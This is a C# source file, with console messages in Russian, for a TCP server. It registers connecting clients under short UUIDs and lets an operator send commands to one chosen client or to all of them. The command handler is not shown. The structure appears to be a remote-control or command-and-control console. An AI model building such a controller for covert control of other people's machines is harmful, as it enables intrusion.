using Server_Control.assets.Commands;
using System;
using System.Collections.Concurrent;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Threading.Tasks;

namespace Server_Control.assets
{
    public class Server
    {
        private readonly IPAddress ServerIP;
        private readonly int ServerPort;
        private TcpListener server;
        public static readonly ConcurrentDictionary<string, TcpClient> clientList = new ConcurrentDictionary<string, TcpClient>();

        public Server(string ServerIP, int ServerPort)
        {
            this.ServerIP = IPAddress.Parse(ServerIP);
            this.ServerPort = ServerPort;
        }
        public Task Start()
        {
            server = new TcpListener(ServerIP, ServerPort);
            server.Start();

            Task.Factory.StartNew(() => HandleConnection());
            Console.WriteLine("Сервер запущен...\nОжидает подключения клиента.");

            while (true)
            {
                TcpClient client = server.AcceptTcpClient();
                string UUID = Guid.NewGuid().ToString().Substring(0, 5);
                string clientIpAddress = ((IPEndPoint)client.Client.RemoteEndPoint).Address.ToString();

                Console.ForegroundColor = ConsoleColor.DarkCyan;
                Console.WriteLine($"Клиент {client.Client.RemoteEndPoint} подключился c UUID {UUID} в {DateTime.Now.ToString("dd.MM.yyyy HH:mm:ss")}.");
                Console.ResetColor();

                var existingClient = clientList.FirstOrDefault(x => ((IPEndPoint)x.Value.Client.RemoteEndPoint).Address.ToString() == clientIpAddress);

                if (existingClient.Value != null)
                {
                    Console.ForegroundColor = ConsoleColor.DarkCyan;
                    clientList.TryRemove(existingClient.Key, out _);
                    Console.WriteLine($"Удаление старого клиента с IP-адресом {clientIpAddress} и UUID {existingClient.Key}");
                    Console.ResetColor();
                }

                clientList.TryAdd(UUID, client);

            }
        }

        public async Task HandleConnection()
        {
            try
            {
                while (true)
                {
                    ConsoleKeyInfo keyInfo;
                    do
                    {
                        keyInfo = Console.ReadKey();

                    } while (keyInfo.Key != ConsoleKey.Enter);

                    Console.ForegroundColor = ConsoleColor.DarkYellow;
                    Console.WriteLine("\nВведите команду или UUID клиента для работы с ним:");
                    Console.ResetColor();

                    while (true)
                    {
                        string Value = Console.ReadLine();

                        if (Value != "$stop")
                        {
                            if (clientList.Count != 0)
                            {
                                if (Server.clientList.ContainsKey(Value))
                                {
                                    Results.Success();

                                    TcpClient client = clientList[Value];

                                    if (client.Connected)
                                    {
                                        ClientHandler clientHandler = new ClientHandler(client, Value);
                                        await clientHandler.Handle(Usage.Disposable);
                                    }

                                    break;
                                }
                                else if (Value.Split(' ').Length is 3 && Server.clientList.ContainsKey(Value.Split(' ')[0]))
                                {

                                    Results.Success();

                                    string[] Data = Value.Split(' ');
                                    TcpClient client = clientList[Data[0]];

                                    if (client.Connected)
                                    {
                                        ClientHandler clientHandler = new ClientHandler(client, Data[0], Data[1], Data[2]);
                                        await clientHandler.Handle(Usage.Reusable);
                                    }

                                    break;

                                }
                                else if (Value.Split(' ').Length is 3 && Value.Split(' ')[0].Contains("all"))
                                {
                                    Results.Success();
                                    string[] Data = Value.Split(' ');

                                    ClientHandler clientHandler = new ClientHandler(Data[1], Data[2]);
                                    await clientHandler.Handle(Usage.All);

                                    break;
                                }
                                else
                                {
                                    Console.ForegroundColor = ConsoleColor.Red;
                                    Console.WriteLine($"Клиент с UUID {Value} не подключен либо IP некорректен, либо контекст команды неверен. Попробуйте еще раз.");
                                    Console.ResetColor();

                                    int currentLineCursor = Console.CursorTop;
                                    Console.SetCursorPosition(0, Console.CursorTop - 2);
                                    Console.Write(new string(' ', Console.WindowWidth));
                                    Console.SetCursorPosition(0, currentLineCursor - 2);
                                }
                            }
                            else
                            {
                                Console.ForegroundColor = ConsoleColor.Red;
                                Console.WriteLine($"Ещё не 1 клиент не подключен, введите команду после подключения клиента");
                                Console.ResetColor();
                            }
                        }
                        else
                        {
                            Task.Factory.StartNew(async () =>
                            {
                                ClientHandler clientHandler = new ClientHandler(Value);
                                await clientHandler.Handle(Usage.All);
                            }).Wait();

                            Environment.Exit(0);
                        }

                    }

                }
            }
            catch (IndexOutOfRangeException)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"Возможно вы ввели неверный формат команды");
                Console.ResetColor();
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"Ошибка при обработке соединения: {ex.Message}");
                Console.ResetColor();
            }
        }
    }
}
